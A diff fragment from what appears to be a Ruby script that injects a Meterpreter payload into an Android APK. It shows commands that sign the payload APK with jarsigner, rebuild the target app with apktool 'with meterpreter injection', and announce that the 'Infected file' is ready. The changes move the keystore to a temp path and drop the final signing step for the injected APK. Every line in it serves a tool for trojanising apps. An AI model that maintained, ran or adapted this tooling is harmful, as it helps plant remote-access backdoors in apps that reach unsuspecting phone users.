@@ -153,7 +153,7 @@ unless(apk_v.split()[1].include?("v2."))
 end
 
 print "[*] Signing payload..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA 'temp/payload.apk' androiddebugkey`
+`jarsigner -verbose -keystore temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA 'temp/payload.apk' androiddebugkey`
 
 `rm -rf temp/original`
 `rm -rf temp/payload`
@@ -204,7 +204,5 @@ fix_manifest()
 
 print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
 `apktool b -o #{injected_apk} temp/original`
-print "[*] Signing #{injected_apk} ..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
 
 puts "[+] Infected file #{injected_apk} ready.\n"
